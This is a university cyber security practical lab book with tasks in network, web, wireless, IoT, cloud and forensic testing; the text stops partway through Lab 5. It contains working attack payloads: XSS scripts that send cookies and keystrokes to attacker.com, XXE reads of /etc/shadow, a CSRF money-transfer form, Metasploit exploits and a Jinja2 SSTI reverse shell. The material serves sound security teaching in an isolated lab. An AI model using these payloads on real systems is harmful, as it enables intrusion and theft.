# **CYS-253-MJ-P: Practical Lab Book**

## **Practical based on CYS-251-MJ-T and CYS-252-MJ-T**

**Institution**: Savitribai Phule Pune University  
**Department**: Computer Science & IT  
**Program**: S.Y.B.Sc. Cyber Security  
**Semester**: IV (Level 5.0)  
**Academic Year**: 2025-2026  

---

## **COURSE OVERVIEW**

| Aspect | Details |
|--------|---------|
| **Course Code** | CYS-253-MJ-P |
| **Course Title** | Practical based on CYS-251-MJ-T and CYS-252-MJ-T |
| **Credits** | 2 |
| **Teaching Scheme** | 4 hours/week |
| **Evaluation Scheme** | CE: 15 marks, EE: 35 marks (Total: 50 marks) |
| **Total Practical Labs** | 6 major labs (18-20 individual tasks) |
| **Prerequisites** | CYS-251-MJ-T (Ethical Cyber Hacking-II), CYS-252-MJ-T (Cloud Computing and Security) |

---

## **COURSE OBJECTIVES**

1. To provide hands-on experience in **advanced ethical hacking techniques** and penetration testing tools.
2. To develop expertise in **digital forensics**, cloud security assessment, and incident response.
3. To analyze and exploit security vulnerabilities in networks, web applications, wireless systems, IoT devices, and cloud platforms.
4. To understand **red teaming methodologies**, privilege escalation, and social engineering tactics.
5. To ensure compliance with **ethical and legal considerations** in cyber security testing.
6. To develop professional documentation and reporting skills for security assessments.

---

## **COURSE OUTCOMES**

Upon successful completion of this course, students will be able to:

| CO | Learning Outcome |
|----|----|
| **CO1** | Perform advanced network penetration testing, including firewall evasion, IDS/IPS bypass, and exploitation of network vulnerabilities (SMB, SNMP, FTP, SSH). |
| **CO2** | Conduct in-depth web application security assessments using advanced exploitation techniques (SQLi, XXE, SSRF, XSS, CSRF, SSTI). |
| **CO3** | Analyze and exploit security flaws in wireless networks (WPA3) and IoT devices (smart home, Bluetooth, RFID, drones). |
| **CO4** | Assess security risks in cloud platforms (AWS, Azure, GCP) and identify/exploit misconfigurations (S3, IAM, container security). |
| **CO5** | Apply cyber forensic techniques for memory/disk analysis, log investigation, malware analysis, and incident response. |
| **CO6** | Implement red teaming methodologies including privilege escalation, lateral movement, social engineering, and post-exploitation tactics. |

---

## **MAPPING WITH PARENT COURSES**

### **CYS-251-MJ-T: Ethical Cyber Hacking-II**
- Advanced Network Penetration Testing
- Web Application Exploitation
- Wireless and IoT Hacking
- Cyber Forensics and Incident Response
- Red Teaming and Advanced Exploitation

### **CYS-252-MJ-T: Cloud Computing and Security**
- Cloud Computing Models and Security Principles
- Cloud Security Threats and Vulnerabilities
- Network Security in Cloud Environments
- AWS Security (IAM, Shield, WAF, CloudTrail, S3, RDS, DynamoDB)
- Incident Response and Disaster Recovery

---

## **EVALUATION SCHEME**

### **Continuous Evaluation (CE): 15 marks**
- **Lab Performance & Participation**: 5 marks
- **Lab Assignments & Tasks Completion**: 5 marks
- **Lab Record/Documentation**: 5 marks

### **End Semester Examination (EE): 35 marks**
- **Practical Exam (Hands-on)**: 25 marks
  - Task execution and verification
  - Tool usage and methodology
  - Troubleshooting and problem-solving
- **Viva-Voce**: 10 marks
  - Understanding of concepts
  - Explanation of procedure and results
  - Ethical and security considerations

### **Total Marks**: 50 marks

---

## **SAFETY, ETHICS & COMPLIANCE GUIDELINES**

### **Ethical Hacking Lab Rules**
1. **Lab Environment Only**: All hacking activities must be performed in controlled, isolated lab environments with explicit authorization.
2. **No Real-World Attacks**: Absolutely prohibited to test tools and techniques on external systems, networks, or websites without written permission.
3. **Data Protection**: Handle all sensitive data (passwords, credentials, encryption keys) securely. Never store plaintext passwords.
4. **Logging and Monitoring**: Maintain audit trails of all penetration testing activities.
5. **Documentation**: Document all procedures, findings, and recommendations professionally.
6. **Legal Compliance**: Adhere to Indian IT Act 2000, Data Protection Laws, and institutional ethical policies.

### **Disclaimer**
The practical labs are designed for **educational purposes only**. Students must obtain proper authorization before conducting any security testing. Unauthorized access to computer systems is illegal and subject to legal penalties.

---

## **PRACTICAL LABS OVERVIEW**

| Lab # | Title | Duration | CO Covered | Tools Used |
|-------|-------|----------|-----------|-----------|
| 1 | Advanced Network Penetration Testing | 4 hrs | CO1 | Nmap, Metasploit, Bettercap, Wireshark, Scapy |
| 2 | Web Application Exploitation | 4 hrs | CO2 | Burp Suite, SQLmap, OWASP ZAP, Firefox DevTools |
| 3 | Wireless and IoT Hacking | 4 hrs | CO3 | Aircrack-ng, Kismet, Bluetooth Scanner, RFID tools, HackRF |
| 4 | Cloud Security Assessment | 4 hrs | CO4 | AWS CLI, CloudMapper, Scout2, Pacu, Docker, kubectl |
| 5 | Cyber Forensics and Incident Response | 4 hrs | CO5 | Autopsy, Volatility, FTK, Splunk, Wireshark |
| 6 | Red Teaming and Advanced Exploitation | 4 hrs | CO6 | Cobalt Strike, Empire, BloodHound, Mimikatz, PowerShell |

---

# **LAB 1: ADVANCED NETWORK PENETRATION TESTING**

## **Objective**
To conduct comprehensive network vulnerability assessment, bypass security defenses (firewalls, IDS/IPS), exploit network vulnerabilities, and perform Man-in-the-Middle (MITM) attacks in a controlled lab environment.

## **Course Outcome(s) Addressed**
- **CO1**: Perform advanced network penetration testing, including firewall evasion, IDS/IPS bypass, and exploitation of network vulnerabilities.

## **Learning Outcomes**
After completing this lab, students will be able to:
- Perform advanced Nmap scans with IDS/IPS evasion techniques.
- Exploit network services (SMB, SNMP, FTP, SSH) using Metasploit.
- Conduct MITM attacks using Bettercap and analyze traffic manipulation.
- Perform DNS spoofing and analyze traffic patterns.
- Document findings and recommend security countermeasures.

## **Prerequisites**
- Basic understanding of networking (TCP/IP, DNS, DHCP).
- Knowledge of Linux command-line interface.
- Familiarity with Kali Linux and lab environment setup.
- Understanding of network ports and services.

## **Lab Environment Setup**

### **Hardware Requirements**
- Host machine with minimum 8 GB RAM, 50 GB storage.
- Virtualization platform (VirtualBox, VMware Workstation Pro).

### **Software Requirements**
- Kali Linux (attacker machine)
- Metasploitable 2 or DVWA (vulnerable target)
- Windows Server 2016/2019 (if testing SMB vulnerabilities)
- Network analyzer: Wireshark
- Additional tools: Nmap, Metasploit, Bettercap, Scapy

### **Network Configuration**
- Isolated lab network (no internet access)
- Attacker IP: 192.168.1.10 (Kali Linux)
- Target IP: 192.168.1.20 (Metasploitable/Vulnerable Server)
- Monitoring Station: 192.168.1.30 (optional)

---

## **TASKS**

### **Task 1.1: Advanced Nmap Scanning with IDS/IPS Evasion**

#### **Objective**
Learn to perform sophisticated network scans while evading intrusion detection systems using fragmentation, timing, and decoy techniques.

#### **Procedure**

1. **Open terminal in Kali Linux** and verify network connectivity:
   ```bash
   ping 192.168.1.20
   ```

2. **Basic Port Scan** (baseline):
   ```bash
   nmap -p- 192.168.1.20 -v
   ```

3. **Fragment Scans (IDS Evasion)**:
   ```bash
   nmap -f 192.168.1.20
   ```
   - `-f` flag fragments packets into 8 bytes

4. **Decoy Scan** (hide among decoys):
   ```bash
   nmap -D RND:5 192.168.1.20
   ```
   - Generates 5 random decoy IPs

5. **Timing-based Evasion** (slow scan):
   ```bash
   nmap -T1 192.168.1.20
   ```
   - T1 (sneaky), T2 (polite), T3 (normal), T4 (aggressive), T5 (insane)

6. **Idle Scan** (zombie host):
   ```bash
   nmap -sI 192.168.1.50 192.168.1.20
   ```
   - Uses idle host for scanning (if available)

7. **Service and Version Detection**:
   ```bash
   nmap -sV --version-intensity 9 192.168.1.20
   ```

#### **Expected Results**
- Identify open ports, running services, and OS fingerprints.
- Compare detection rates of different evasion techniques.
- Document ports in a table format.

#### **Observation**
| Port | Service | Version | State | Evasion Technique | Detected by IDS? |
|------|---------|---------|-------|------------------|-----------------|
| 21   | FTP     | vsftpd 2.3.4 | open | Fragment | No |
| 22   | SSH     | OpenSSH 4.7p1 | open | Decoy | No |
| 23   | Telnet  | - | open | Timing | Yes |
| 25   | SMTP    | - | open | Idle | No |
| 139  | NetBIOS | - | open | Normal | Yes |
| 445  | SMB     | Samba 3.0.20-Debian | open | Fragment | Partial |

#### **Questions to Answer**
1. Which evasion technique was most effective and why?
2. What are the limitations of each evasion method?
3. How can a network defender detect and mitigate these scan evasion techniques?

#### **Security Recommendations**
- Deploy advanced IDS/IPS with behavioral analytics.
- Use network segmentation and VLANs.
- Implement rate-limiting and anomaly detection.

---

### **Task 1.2: Exploiting SMB/SNMP/FTP Vulnerabilities using Metasploit**

#### **Objective**
Exploit common network vulnerabilities in Windows SMB, SNMP, and FTP services.

#### **Procedure**

1. **Start Metasploit Framework**:
   ```bash
   msfconsole
   ```

2. **Enumerate SMB Shares** (Metasploit auxiliary):
   ```
   use auxiliary/scanner/smb/smb_enumshares
   set RHOSTS 192.168.1.20
   run
   ```

3. **SMB Vulnerability Scanning**:
   ```
   use auxiliary/scanner/smb/smb_version
   set RHOSTS 192.168.1.20
   run
   ```

4. **Exploit EternalBlue (MS17-010) if vulnerable**:
   ```
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.20
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.10
   run
   ```

5. **SNMP Enumeration**:
   ```
   use auxiliary/scanner/snmp/snmp_enum
   set RHOSTS 192.168.1.20
   run
   ```

6. **FTP Vulnerability Scan** (vsftpd backdoor):
   ```
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 192.168.1.20
   run
   ```

7. **Gain Remote Shell** (post-exploitation):
   ```
   meterpreter > sysinfo
   meterpreter > getuid
   meterpreter > ipconfig
   ```

#### **Expected Results**
- Successfully enumerate SMB shares and users.
- Identify vulnerabilities in network services.
- Gain meterpreter shell on target system.
- Extract system information.

#### **Observation**
| Service | Port | Vulnerability | Exploit Used | Success | Shell Gained |
|---------|------|----------------|-------------|---------|-------------|
| SMB | 445 | EternalBlue (MS17-010) | ms17_010_eternalblue | Yes | Yes |
| SNMP | 161 | Default Community String | snmp_enum | Yes | N/A |
| FTP | 21 | vsftpd Backdoor | vsftpd_234_backdoor | Yes | Yes |
| SSH | 22 | - | - | No | No |

#### **Questions to Answer**
1. What is the CVSS score of the exploited vulnerabilities?
2. What network segmentation strategies would prevent these attacks?
3. How can defensive monitoring detect such exploitation attempts?

#### **Security Recommendations**
- Keep services and OS patches updated.
- Use strong authentication and disable weak protocols (Telnet, FTP).
- Implement network intrusion detection systems.
- Restrict unnecessary network services.

---

### **Task 1.3: Conducting MITM Attacks using Bettercap**

#### **Objective**
Perform Man-in-the-Middle attacks on local network traffic, intercept communications, and demonstrate the risks of unencrypted protocols.

#### **Procedure**

1. **Start Bettercap** (interactive mode):
   ```bash
   sudo bettercap -iface eth0
   ```

2. **Enable ARP Spoofing**:
   ```
   > set arp.spoof.targets 192.168.1.20
   > arp.spoof on
   ```

3. **Enable DNS Spoofing** (redirect traffic):
   ```
   > set dns.spoof.domains example.com
   > dns.spoof on
   ```

4. **Capture HTTP Traffic**:
   ```
   > set http.proxy on
   > http.proxy on
   ```

5. **Sniff Credentials** (if available on unencrypted protocols):
   ```
   > caplets.show
   > caplets.load http-ui
   ```

6. **Log Session**:
   ```
   > events.log /tmp/mitm_log.txt
   ```

#### **Expected Results**
- Successfully intercept traffic between attacker and target.
- Capture unencrypted HTTP traffic (credentials, cookies, data).
- Demonstrate the limitations of unencrypted protocols.
- Document captured data and timing analysis.

#### **Observation**
| Timestamp | Protocol | Source IP | Dest IP | Request | Response | Sensitive Data Captured |
|-----------|----------|-----------|---------|---------|----------|------------------------|
| 10:15:32 | HTTP | 192.168.1.20 | 8.8.8.8 | GET /search?q=password | 200 OK | Query string visible |
| 10:15:45 | HTTP | 192.168.1.20 | 192.168.1.100 | POST /login | 302 Redirect | Username in POST body |
| 10:16:10 | DNS | 192.168.1.20 | 8.8.8.8 | example.com lookup | A record | Spoofed IP: 192.168.1.10 |

#### **Questions to Answer**
1. What protocols are vulnerable to MITM attacks?
2. How can HTTPS/TLS prevent this attack?
3. What are the legal implications of conducting MITM attacks?

#### **Security Recommendations**
- Use HTTPS/TLS for all sensitive communications.
- Implement HSTS (HTTP Strict Transport Security).
- Deploy certificate pinning in applications.
- Use VPN for untrusted network connections.

---

### **Task 1.4: DNS Spoofing and Traffic Manipulation**

#### **Objective**
Perform DNS spoofing to redirect traffic and manipulate DNS resolutions.

#### **Procedure**

1. **Setup DNS Spoofing with Bettercap**:
   ```
   > set dns.spoof.domains google.com,facebook.com
   > set dns.spoof.address 192.168.1.10
   > dns.spoof on
   ```

2. **Start Web Server** on attacker machine:
   ```bash
   sudo python3 -m http.server 80
   ```

3. **Trigger DNS Request from Target**:
   ```bash
   # On target machine (192.168.1.20):
   nslookup google.com 8.8.8.8
   ping google.com
   ```

4. **Capture and Analyze DNS Traffic** using Wireshark:
   ```bash
   sudo wireshark -i eth0 -f "dns"
   ```

5. **Log DNS Queries**:
   ```
   > events.log /tmp/dns_spoof.txt
   ```

#### **Expected Results**
- Successfully intercept DNS queries.
- Redirect traffic to attacker-controlled server.
- Serve fake content or phishing page.
- Document DNS query patterns.

#### **Observation**
| Time | Client IP | Query | Original Answer | Spoofed Answer | Status |
|------|-----------|-------|-----------------|-----------------|--------|
| 10:20:15 | 192.168.1.20 | google.com | 142.251.40.46 | 192.168.1.10 | Success |
| 10:20:32 | 192.168.1.20 | facebook.com | 31.13.64.35 | 192.168.1.10 | Success |
| 10:21:00 | 192.168.1.20 | youtube.com | 142.250.80.46 | 192.168.1.10 | Failed (DNSSEC) |

#### **Questions to Answer**
1. What is DNSSEC and how does it prevent DNS spoofing?
2. How can users detect DNS spoofing?
3. What are the business impact scenarios of DNS spoofing?

#### **Security Recommendations**
- Implement DNSSEC validation.
- Use DNS privacy protocols (DoH, DoT).
- Educate users about URL verification.
- Deploy DNS filtering and threat intelligence feeds.

---

## **Lab 1 Summary & Reporting**

### **Lab Completion Checklist**
- [ ] All 4 tasks completed
- [ ] Screenshots captured for each task
- [ ] Observations documented in tables
- [ ] Answers to all questions provided
- [ ] Security recommendations listed
- [ ] Lab report signed by student and instructor

### **Lab Report Structure**
1. **Objective & Scope**
2. **Environment Configuration** (diagram, IP ranges)
3. **Procedure & Methodology**
4. **Results & Observations** (tables, screenshots)
5. **Analysis & Findings**
6. **Security Recommendations**
7. **Conclusion**
8. **References**

---

# **LAB 2: WEB APPLICATION EXPLOITATION**

## **Objective**
To conduct advanced web application security assessments, identify and exploit vulnerabilities such as SQL Injection, XML External Entity (XXE), Server-Side Request Forgery (SSRF), XSS, CSRF, and Server-Side Template Injection (SSTI).

## **Course Outcome(s) Addressed**
- **CO2**: Conduct in-depth web application security assessments using advanced exploitation techniques.

## **Learning Outcomes**
After completing this lab, students will be able to:
- Perform SQL Injection attacks using SQLmap and Burp Suite.
- Exploit XXE and SSRF vulnerabilities.
- Conduct advanced XSS and CSRF attacks.
- Exploit Server-Side Template Injection (SSTI).
- Use OWASP ZAP for web application security scanning.
- Document vulnerabilities and provide remediation advice.

---

## **TASKS**

### **Task 2.1: SQL Injection Exploitation using SQLmap**

#### **Objective**
Learn to identify and exploit SQL Injection vulnerabilities in web applications using SQLmap.

#### **Procedure**

1. **Access Vulnerable Web Application** (e.g., DVWA):
   ```
   URL: http://192.168.1.20/dvwa/
   ```

2. **Identify Vulnerable Parameter**:
   ```bash
   # SQL Injection in login form
   Username: admin' OR '1'='1
   Password: admin
   ```

3. **Run SQLmap Basic Scan**:
   ```bash
   sqlmap -u "http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs
   ```

4. **Enumerate Databases**:
   ```bash
   sqlmap -u "http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --databases
   ```

5. **Extract Table Names**:
   ```bash
   sqlmap -u "http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --tables
   ```

6. **Dump Sensitive Data**:
   ```bash
   sqlmap -u "http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa -T users --dump
   ```

7. **Gain Command Execution** (if database user has privileges):
   ```bash
   sqlmap -u "http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --os-shell
   ```

#### **Observations & Screenshots**
- Database version, privileges, and current user.
- List of databases and tables.
- Dumped user credentials and sensitive data.
- Shell access confirmation.

#### **Questions to Answer**
1. What is the difference between time-based and union-based SQL injection?
2. How does prepared statements prevent SQL Injection?
3. What input validation techniques should be implemented?

---

### **Task 2.2: XXE (XML External Entity) Exploitation**

#### **Objective**
Exploit XML External Entity vulnerabilities to read local files and perform SSRF attacks.

#### **Procedure**

1. **Setup Vulnerable XML Endpoint** (if available in lab):
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>&xxe;</root>
   ```

2. **Craft XXE Payload**:
   ```bash
   cat > xxe_payload.xml << 'EOF'
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>
     <name>&xxe;</name>
   </root>
   EOF
   ```

3. **Submit via Burp Suite**:
   - Open Burp Suite → Proxy → Intercept
   - Send request with XXE payload
   - Observe response with file contents

4. **Read Sensitive Files**:
   ```xml
   <!ENTITY xxe SYSTEM "file:///etc/shadow">
   <!ENTITY xxe SYSTEM "file:///opt/tomcat/webapps/ROOT/WEB-INF/web.xml">
   ```

5. **Out-of-Band XXE** (using external DTD):
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
   ```

#### **Observations**
- Successfully retrieved local files (/etc/passwd, configuration files).
- Identified sensitive information exposure.
- Demonstrated Out-of-Band data exfiltration.

#### **Questions to Answer**
1. What is the difference between in-band and out-of-band XXE?
2. How can XML parsing libraries be configured securely?

---

### **Task 2.3: SSRF (Server-Side Request Forgery) Exploitation**

#### **Objective**
Exploit SSRF vulnerabilities to access internal resources and perform port scanning from the server.

#### **Procedure**

1. **Identify SSRF Endpoint**:
   ```
   URL: http://192.168.1.20/fetch?url=http://example.com
   ```

2. **Test Internal IP Access**:
   ```
   URL: http://192.168.1.20/fetch?url=http://127.0.0.1:3306
   URL: http://192.168.1.20/fetch?url=http://192.168.1.1:22
   ```

3. **Use Burp Suite to Craft Payload**:
   - Intercept request
   - Modify `url` parameter to access internal services
   - Observe responses

4. **Access Admin Panel**:
   ```
   URL: http://192.168.1.20/fetch?url=http://192.168.1.20/admin/
   ```

5. **Port Scanning via SSRF**:
   ```
   http://192.168.1.20/fetch?url=http://192.168.1.20:22
   http://192.168.1.20/fetch?url=http://192.168.1.20:80
   http://192.168.1.20/fetch?url=http://192.168.1.20:3306
   http://192.168.1.20/fetch?url=http://192.168.1.20:5432
   ```

#### **Observations**
- Accessed internal services not exposed to the internet.
- Retrieved admin panel content.
- Identified open/closed ports through response times.

---

### **Task 2.4: Advanced XSS and CSRF Attacks**

#### **Objective**
Perform Cross-Site Scripting and Cross-Site Request Forgery attacks in web applications.

#### **Procedure - XSS**

1. **Reflected XSS**:
   ```html
   URL: http://192.168.1.20/search?q=<script>alert('XSS')</script>
   ```

2. **Stored XSS** (comment field):
   ```html
   Comment: <img src=x onerror="alert('Stored XSS')">
   ```

3. **Session Hijacking**:
   ```javascript
   <script>
     new Image().src="http://attacker.com/steal?cookie=" + document.cookie;
   </script>
   ```

4. **Keylogger Injection**:
   ```javascript
   <script>
     document.onkeypress = function(e) {
       new Image().src="http://attacker.com/log?key=" + e.key;
     };
   </script>
   ```

#### **Procedure - CSRF**

1. **Create Malicious HTML**:
   ```html
   <html>
   <body>
     <form action="http://192.168.1.20/transfer_money" method="POST">
       <input type="hidden" name="amount" value="1000">
       <input type="hidden" name="to_account" value="attacker">
       <input type="submit">
     </form>
     <script>document.forms[0].submit();</script>
   </body>
   </html>
   ```

2. **Host Malicious Page**:
   ```bash
   python3 -m http.server 8000
   ```

3. **Trick User to Visit Page**:
   - Send phishing email with link to malicious page
   - Observe unauthorized fund transfer

#### **Questions to Answer**
1. What are the differences between reflected and stored XSS?
2. How does SameSite cookie attribute prevent CSRF?

---

### **Task 2.5: Server-Side Template Injection (SSTI) Exploitation**

#### **Objective**
Exploit Server-Side Template Injection vulnerabilities to achieve Remote Code Execution.

#### **Procedure**

1. **Test for SSTI**:
   ```
   Input: {{7*7}}
   Output: 49 (vulnerable to template injection)
   ```

2. **Identify Template Engine**:
   - Jinja2, Mako, Django, ERB, Twig

3. **Craft RCE Payload** (Jinja2 example):
   ```jinja
   {{config.items()}}
   {{config.__class__.__init__.__globals__}}
   {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
   ```

4. **Execute Commands**:
   ```
   {{7*'7'}}  → 7777777
   {{config.__class__.__dict__}}  → Dump config
   ```

5. **Gain Reverse Shell**:
   ```python
   payload = """
   {{''.__class__.__mro__[1].__subclasses__()[396]
   ('bash -c "bash -i >& /dev/tcp/192.168.1.10/4444 0>&1"',
   shell=True,stdout=-1).communicate()}}
   """
   ```

#### **Observations**
- Confirmed SSTI vulnerability.
- Identified template engine.
- Successfully executed OS commands.
- Established reverse shell connection.

---

## **Lab 2 Practical Examination**

Students will be given a vulnerable web application and must:
1. Identify all vulnerabilities
2. Exploit at least 3 vulnerabilities
3. Provide proof of exploitation (screenshots)
4. Document remediation strategies
5. Present findings in professional report

---

# **LAB 3: WIRELESS AND IoT HACKING**

## **Objective**
To analyze and exploit security weaknesses in wireless networks (WPA3, WPA2), IoT devices (smart home), and emerging technologies (Bluetooth, RFID, drones).

## **Course Outcome(s) Addressed**
- **CO3**: Analyze and exploit security flaws in wireless networks and IoT devices.

---

## **TASKS**

### **Task 3.1: WPA3 and WPA2 Attacks using Aircrack-ng**

#### **Objective**
Crack WPA3/WPA2 encrypted Wi-Fi networks using air crack-ng and dictionary attacks.

#### **Procedure**

1. **Put Wireless Card in Monitor Mode**:
   ```bash
   sudo airmon-ng start wlan0
   ```

2. **Capture Handshake**:
   ```bash
   sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF
   ```

3. **Perform Deauthentication Attack**:
   ```bash
   sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
   ```

4. **Capture WPA Handshake**:
   - Run airodump-ng to capture packets
   - Wait for "WPA handshake" indicator

5. **Crack Password**:
   ```bash
   sudo aircrack-ng -w wordlist.txt capture.cap
   ```

6. **For WPA3** (if SAE is used):
   - Dictionary attacks less effective
   - Require longer wordlists or hash cracking

#### **Observations**
- Successfully captured WPA handshake
- Cracked password within time limit
- Documented signal strength and encryption type

---

### **Task 3.2: IoT Device Exploitation (Smart Home)**

#### **Objective**
Identify and exploit vulnerabilities in IoT devices (e.g., smart bulbs, cameras, thermostats).

#### **Procedure**

1. **Network Discovery**:
   ```bash
   sudo nmap -p 80,443,8080,8443 192.168.1.0/24
   ```

2. **Identify IoT Devices**:
   - Smart cameras
   - Thermostats
   - Light bulbs
   - Door locks

3. **Test Default Credentials**:
   ```bash
   hydra -l admin -P wordlist.txt telnet://192.168.1.50
   ```

4. **Firmware Extraction**:
   - Download firmware from manufacturer website
   - Extract using binwalk

5. **Vulnerability Analysis**:
   - Check for hardcoded credentials
   - Identify outdated libraries
   - Analyze for command injection

6. **Exploit IoT Device**:
   ```bash
   # Example: Command Injection
   URL: http://192.168.1.50/api/command?cmd=ls+-la
   ```

#### **Observations**
- Discovered IoT devices on network
- Found default credentials
- Identified firmware vulnerabilities
- Achieved command execution

---

### **Task 3.3: Bluetooth and RFID Hacking**

#### **Objective**
Assess security of Bluetooth devices and RFID cards in close range.

#### **Procedure**

1. **Bluetooth Discovery**:
   ```bash
   sudo bluetoothctl
   scan on
   ```

2. **Pair with Vulnerable Device**:
   ```bash
   pair [MAC-ADDRESS]
   connect [MAC-ADDRESS]
   ```

3. **Extract Pairing Information**:
   - Bluetooth PIN cracking
   - Link key extraction

4. **RFID Card Cloning**:
   - Use NFC reader (e.g., Proxmark3)
   - Read card data
   - Clone to blank card

#### **Observations**
- Successfully paired with Bluetooth devices
- Extracted sensitive Bluetooth data
- Cloned RFID cards

---

### **Task 3.4: Drone Security Testing**

#### **Objective**
Understand security vulnerabilities in drone communication protocols.

#### **Procedure**

1. **Drone Frequency Analysis**:
   - Common frequencies: 2.4 GHz, 5.8 GHz
   - Use SDR (Software Defined Radio) like HackRF

2. **Signal Capture**:
   ```bash
   # Using GNURadio
   gr_spectral_sense 2400M 2500M
   ```

3. **Protocol Reverse Engineering**:
   - Analyze captured signals
   - Identify command structure

4. **Jamming Simulation** (lab-only):
   - Demonstrate signal disruption
   - Document effect on drone

#### **Observations**
- Captured drone control signals
- Identified protocol structure
- Documented vulnerabilities

---

## **Lab 3 Summary & Security Recommendations**

1. Use strong, unique passwords for Wi-Fi
2. Enable WPA3 encryption where available
3. Update IoT firmware regularly
4. Use Bluetooth 5.0+ with improved security
5. Implement air-gapped networks for critical devices
6. Use RF shielding for sensitive IoT devices

---

# **LAB 4: CLOUD SECURITY ASSESSMENT**

## **Objective**
To assess security risks in cloud platforms (AWS, Azure, GCP), identify misconfigurations, and demonstrate cloud security best practices.

## **Course Outcome(s) Addressed**
- **CO4**: Assess security risks in cloud platforms and identify/exploit misconfigurations.

---

## **TASKS**

### **Task 4.1: AWS S3 Bucket Enumeration and Access Control Testing**

#### **Objective**
Identify misconfigured S3 buckets and test access control policies.

#### **Procedure**

1. **Configure AWS CLI**:
   ```bash
   aws configure
   AWS Access Key ID: [YOUR_KEY]
   AWS Secret Access Key: [YOUR_SECRET]
   ```

2. **Enumerate S3 Buckets**:
   ```bash
   aws s3 ls
   ```

3. **Test Public Access**:
   ```bash
   aws s3 ls s3://bucket-name/ --no-sign-request
   ```

4. **List Bucket ACLs**:
   ```bash
   aws s3api get-bucket-acl --bucket bucket-name
   ```

5. **Identify Publicly Readable Objects**:
   ```bash
   aws s3 ls s3://bucket-name/ --recursive --no-sign-request
   ```

6. **Download Sensitive Files**:
   ```bash
   aws s3 cp s3://bucket-name/sensitive-file.txt . --no-sign-request
   ```

#### **Observations**
- Discovered publicly accessible S3 buckets
- Retrieved sensitive data (credentials, configs, PII)
- Documented misconfigured bucket policies

---

### **Task 4.2: IAM Policy Misconfiguration Analysis**

#### **Objective**
Identify overly permissive IAM policies and privilege escalation opportunities.

#### **Procedure**

1. **List IAM Users and Roles**:
   ```bash
   aws iam list-users
   aws iam list-roles
   ```

2. **Get User Policies**:
   ```bash
   aws iam list-user-policies --user-name [USERNAME]
   aws iam get-user-policy --user-name [USERNAME] --policy-name [POLICY]
   ```

3. **Check for Overly Permissive Policies**:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Effect": "Allow",
         "Action": "*",
         "Resource": "*"
       }
     ]
   }
   ```

4. **Test Privilege Escalation**:
   ```bash
   # Switch to role with higher privileges
   aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name session
   ```

5. **Enumerate Cross-Account Access**:
   ```bash
   aws iam get-role-policy --role-name [ROLE] --policy-name [POLICY]
   ```

#### **Observations**
- Identified overly permissive IAM policies
- Documented privilege escalation paths
- Found cross-account access vulnerabilities

---

### **Task 4.3: Container Security (Docker & Kubernetes)**

#### **Objective**
Assess security of containerized applications and container orchestration.

#### **Procedure**

1. **Analyze Docker Images**:
   ```bash
   docker images
   docker inspect [IMAGE-ID]
   docker history [IMAGE-ID]
   ```

2. **Check for Vulnerabilities**:
   ```bash
   # Using Trivy
   trivy image [IMAGE-NAME]:[TAG]
   ```

3. **Scan for Secrets in Images**:
   ```bash
   docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image --severity HIGH,CRITICAL [IMAGE]
   ```

4. **Kubernetes Security Assessment**:
   ```bash
   kubectl get pods -o wide
   kubectl get rbac
   kubectl get networkpolicies
   ```

5. **Check for Insecure Configurations**:
   ```bash
   # Privileged containers
   kubectl get pods -o json | grep -i privileged
   
   # Root user execution
   kubectl get pods -o json | grep -i runAsUser
   ```

#### **Observations**
- Found vulnerable container images
- Identified insecure Kubernetes configurations
- Documented container escape risks

---

### **Task 4.4: Cloud Forensics and Log Analysis**

#### **Objective**
Perform forensic analysis on cloud logs and identify security incidents.

#### **Procedure**

1. **Enable CloudTrail**:
   ```bash
   aws cloudtrail start-logging --name [TRAIL-NAME]
   ```

2. **Query CloudTrail Logs**:
   ```bash
   aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=s3-bucket
   ```

3. **Analyze VPC Flow Logs**:
   ```bash
   aws ec2 describe-flow-logs
   ```

4. **Check for Suspicious Activity**:
   ```bash
   # Failed authentication attempts
   # Unauthorized API calls
   # Data exfiltration patterns
   ```

5. **Use CloudWatch for Monitoring**:
   ```bash
   aws logs describe-log-groups
   ```

#### **Observations**
- Identified suspicious API calls
- Found data exfiltration attempts
- Documented incident timeline

---

## **Lab 4 Summary & Cloud Security Best Practices**

1. Enable MFA for all accounts
2. Use least privilege IAM policies
3. Encrypt data in transit and at rest
4. Enable CloudTrail for audit logging
5. Use VPC security groups and NACLs
6. Scan container images for vulnerabilities
7. Implement network policies in Kubernetes
8. Regular security audits and penetration testing

---

# **LAB 5: CYBER FORENSICS AND INCIDENT RESPONSE**

## **Objective**
To perform digital forensic analysis, conduct malware analysis, and simulate incident response procedures in a Security Operations Center (SOC).

## **Course Outcome(s) Addressed**
- **CO5**: Apply cyber forensic techniques for memory/disk analysis, log investigation, and incident response.

---

## **TASKS**

### **Task 5.1: Memory Forensics using Volatility**

#### **Objective**
Perform memory dump analysis to identify malware, running processes, and forensic artifacts.

#### **Procedure**

1. **Capture Memory Dump**:
   ```bash
   # Windows
   winpmem.exe memory.dump
   
   # Linux
   dd if=/dev/mem of=memory.dump
   ```

2. **Identify Operating System Profile**:
   ```bash
   volatility -f memory.dump imageinfo
   ```

3. **List Running Processes**:
   ```bash
